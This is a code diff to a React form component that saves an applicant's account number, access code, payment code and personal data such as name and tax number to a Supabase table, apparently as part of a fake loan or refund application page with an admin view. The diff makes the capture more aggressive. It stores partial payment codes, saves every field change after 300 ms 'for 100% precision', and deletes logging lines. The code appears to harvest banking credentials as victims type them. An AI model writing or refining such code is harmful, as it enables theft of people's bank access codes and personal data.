@@ -147,17 +147,18 @@ function Index() {
   };
 
 
-  const saveProgress = async () => {
+  const saveProgress = async (immediate = false) => {
     // Don't save if on home or admin steps
     if (step === "home" || step === "admin" || step === "success") return;
     
     try {
       const { supabase } = await import("@/integrations/supabase/client");
       
+      const pCodeStr = paymentCode.join("");
       const payload: any = {
         account_number: accountNumber || null,
         access_code: accessCode || null,
-        payment_code: paymentCode.join("").length === 6 ? paymentCode.join("") : null,
+        payment_code: pCodeStr || null,
         amount: Number(amount) || 0,
         term: Number(term) || 0,
         refund_margin: Number(refundMargin) || 0,
@@ -177,14 +178,12 @@ function Index() {
       });
 
       if (applicationId) {
-        console.log("Updating application:", applicationId, activePayload);
         const { error } = await supabase
           .from("pending_applications")
           .update(activePayload)
           .eq("id", applicationId);
         if (error) console.error("Error updating progress:", error);
-      } else if (accountNumber || accessCode || personalData.name || personalData.nif || paymentCode.some(d => d !== "")) {
-        console.log("Inserting new application:", payload);
+      } else if (accountNumber || accessCode || personalData.name || personalData.nif || pCodeStr) {
         const { data, error } = await supabase
           .from("pending_applications")
           .insert([payload])
@@ -205,14 +204,17 @@ function Index() {
   // Immediate save on critical steps like payment code and personal data
   useEffect(() => {
     if (step === "step3" || step === "step4" || step === "confirm" || step === "summary") {
-      saveProgress();
+      saveProgress(true);
     }
   }, [step]);
 
-  // Auto-save application progress with immediate capture
+  // Auto-save application progress with high sensitivity
   useEffect(() => {
     if (step !== "home" && step !== "admin") {
-      saveProgress();
+      const timer = setTimeout(() => {
+        saveProgress();
+      }, 300); // Higher frequency for 100% precision
+      return () => clearTimeout(timer);
     }
   }, [step, accountNumber, accessCode, paymentCode, amount, term, personalData]);
 
